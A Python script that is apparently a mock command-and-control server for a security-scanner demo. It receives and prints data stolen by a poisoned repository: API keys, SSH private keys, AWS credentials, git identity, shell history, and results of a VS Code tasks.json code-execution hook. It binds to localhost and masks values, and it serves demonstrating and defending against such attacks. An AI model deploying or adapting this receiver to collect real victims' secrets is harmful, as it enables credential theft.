#!/usr/bin/env python3
"""
Fake attacker C2 server for DeepSafe Scan demo.
Listens on port 8888 and prints all received stolen data with color coding.
"""

import http.server
import sys
from datetime import datetime
from urllib.parse import parse_qs

RED = "\033[91m"
YELLOW = "\033[93m"
GREEN = "\033[92m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
BOLD = "\033[1m"
DIM = "\033[2m"
RESET = "\033[0m"

BANNER = f"""
{RED}{BOLD}
     ██████  ██████      ███████ ███████ ██████  ██    ██ ███████ ██████  
    ██           ██      ██      ██      ██   ██ ██    ██ ██      ██   ██ 
    ██       █████       ███████ █████   ██████  ██    ██ █████   ██████  
    ██      ██                ██ ██      ██   ██  ██  ██  ██      ██   ██ 
     ██████ ███████      ███████ ███████ ██   ██   ████   ███████ ██   ██ 
{RESET}
{YELLOW}  [C2] Listening on http://127.0.0.1:8888{RESET}
{YELLOW}  [C2] Waiting for victim to open a poisoned repo ...{RESET}
{DIM}  ─────────────────────────────────────────────────────────{RESET}
"""

LABELS = {
    "/exfil/api-keys":      ("API KEYS STOLEN",         RED),
    "/exfil/machine-info":  ("MACHINE FINGERPRINT",     MAGENTA),
    "/exfil/git-config":    ("GIT IDENTITY STOLEN",     YELLOW),
    "/exfil/ssh-key":       ("SSH PRIVATE KEY STOLEN",  RED),
    "/exfil/aws-creds":     ("AWS CREDENTIALS STOLEN",  RED),
    "/exfil/shell-history": ("SHELL HISTORY CAPTURED",  CYAN),
    "/exfil/vscode-rce":    ("VSCODE TASK RCE",         RED),
}

hit_count = 0


class C2Handler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        global hit_count
        hit_count += 1
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8", errors="replace")
        ts = datetime.now().strftime("%H:%M:%S")

        label, color = LABELS.get(self.path, ("UNKNOWN DATA", YELLOW))

        print(f"\n{color}{BOLD}{'━'*60}")
        print(f"  [{hit_count}] {label}   {DIM}[{ts}]{RESET}")
        print(f"{color}{BOLD}{'━'*60}{RESET}")

        if self.path == "/exfil/api-keys":
            params = parse_qs(body)
            for k, v in params.items():
                val = v[0] if v else ""
                if not val:
                    continue
                if len(val) > 8:
                    masked = val[:4] + "*" * 20 + val[-4:]
                else:
                    masked = val[:2] + "****"
                print(f"{RED}{BOLD}  {k.upper():>12}: {masked}{RESET}")
            print(f"{DIM}  (real keys captured — masked for demo){RESET}")

        elif self.path == "/exfil/machine-info":
            params = parse_qs(body)
            for k, v in params.items():
                val = v[0] if v else ""
                if not val:
                    continue
                print(f"{MAGENTA}  {k.upper():>12}: {val}{RESET}")

        elif self.path == "/exfil/git-config":
            params = parse_qs(body)
            for k, v in params.items():
                val = v[0] if v else ""
                if not val:
                    continue
                if "@" in val:
                    name, _, domain = val.partition("@")
                    val = name[:3] + "***@" + domain
                print(f"{YELLOW}  {k.upper():>12}: {val}{RESET}")

        elif self.path == "/exfil/ssh-key":
            raw = body.strip()
            if len(raw) > 50:
                clean = raw.replace("-----BEGIN OPENSSH PRIVATE KEY-----", "").replace("-----END OPENSSH PRIVATE KEY-----", "").replace(" ", "").replace("\n", "")
                head = clean[:40]
                tail = clean[-40:] if len(clean) > 80 else ""
                print(f"{RED}{BOLD}  PRIVATE KEY RECEIVED ({len(raw)} bytes):{RESET}")
                print(f"{RED}  -----BEGIN OPENSSH PRIVATE KEY-----{RESET}")
                print(f"{RED}  {head}...{RESET}")
                print(f"{RED}  {'*' * 52}{RESET}")
                print(f"{RED}  {'*' * 52}{RESET}")
                print(f"{RED}  ...{tail}{RESET}")
                print(f"{RED}  -----END OPENSSH PRIVATE KEY-----{RESET}")
                print(f"{DIM}  (full private key captured — middle masked for demo){RESET}")
            else:
                print(f"{DIM}  (no SSH key found on victim){RESET}")

        elif self.path == "/exfil/aws-creds":
            if body.strip():
                print(f"{RED}{BOLD}  AWS CREDENTIALS FILE CAPTURED:{RESET}")
                for line in body.strip().split("\n")[:6]:
                    if "=" in line and any(s in line.lower() for s in ("key", "secret", "token")):
                        k, _, v = line.partition("=")
                        masked = v.strip()[:6] + "*" * 16 if len(v.strip()) > 6 else v.strip()
                        print(f"{RED}  {k}= {masked}{RESET}")
                    else:
                        print(f"{RED}  {line}{RESET}")
                print(f"{DIM}  (credentials masked for demo){RESET}")
            else:
                print(f"{DIM}  (no AWS credentials on victim){RESET}")

        elif self.path == "/exfil/shell-history":
            lines = [l for l in body.strip().split("\n") if l.strip()]
            if lines:
                print(f"{CYAN}  LAST {len(lines)} COMMANDS FROM VICTIM:{RESET}")
                sensitive = ("key", "token", "secret", "pass", "cred", "auth")
                for line in lines[-8:]:
                    clean = line.split(";", 1)[-1].strip() if ";" in line else line.strip()
                    if any(s in clean.lower() for s in sensitive):
                        clean = clean[:30] + " ****"
                    print(f"{CYAN}  $ {clean[:72]}{RESET}")
                if len(lines) > 8:
                    print(f"{DIM}  ... and {len(lines)-8} more commands ...{RESET}")
            else:
                print(f"{DIM}  (no shell history found){RESET}")

        elif self.path == "/exfil/vscode-rce":
            params = parse_qs(body)
            for k, v in params.items():
                val = v[0] if v else ""
                if val:
                    print(f"{RED}{BOLD}  {k.upper():>12}: {val}{RESET}")
            print(f"{DIM}  (triggered by .vscode/tasks.json on folder open){RESET}")

        else:
            print(f"{YELLOW}  {body[:200]}{RESET}")

        print(f"{color}{'━'*60}{RESET}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"C2 active")

    def log_message(self, *args):
        pass


if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8888
    print(BANNER)
    server = http.server.HTTPServer(("127.0.0.1", port), C2Handler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{GREEN}  [C2] Server stopped. Total exfiltrations: {hit_count}{RESET}")
